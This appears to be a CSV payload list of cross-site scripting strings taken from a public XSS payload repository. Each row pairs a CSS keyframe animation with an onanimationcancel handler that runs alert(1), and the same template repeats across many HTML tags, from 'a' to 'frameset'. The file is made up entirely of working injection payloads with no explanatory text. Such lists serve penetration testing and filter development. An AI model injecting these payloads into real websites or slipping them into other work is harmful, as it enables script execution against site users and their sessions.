cve,tag,payload,url
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></a>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><abbr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></abbr>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></acronym>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><address id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></address>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><applet id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></applet>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></audio>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></b>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></base>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></basefont>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bdi>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdo id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bdo>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blink>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blockquote>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></body>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></br>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></button>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><center id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></center>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></cite>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></col>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></colgroup>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><command id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></command>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></data>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dfn>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dir>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></div>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dl>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dt>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></fieldset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figure>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></font>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></footer>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frame>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
,XSS,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",https://raw.githubusercontent.com/Proviesec/xss-payload-list/main/xss-all-list.txt
